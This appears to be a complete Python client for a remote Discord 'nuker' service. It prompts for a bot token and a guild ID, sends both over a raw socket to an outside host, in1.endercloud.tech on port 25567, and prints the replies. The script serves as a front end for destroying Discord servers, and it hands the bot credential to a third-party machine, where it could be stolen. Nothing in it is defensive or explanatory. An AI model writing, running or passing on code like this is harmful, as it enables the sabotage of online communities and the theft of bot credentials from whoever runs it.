import socket

TOKEN = input("Enter Bot Token: ")
GUILD = input("Enter guild ID: ")
server_host = 'in1.endercloud.tech'
server_port = 25567
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_host, server_port))
print(f"Connected to the nuker")

client_socket.send(TOKEN.encode('utf-8'))
client_socket.send(GUILD.encode('utf-8'))

while True:
    try:
        a = client_socket.recv(2048).decode('utf-8')
        if a.endswith('\n'):
            print(a)
        else:
            print(a,end='\n')
    except:
        continue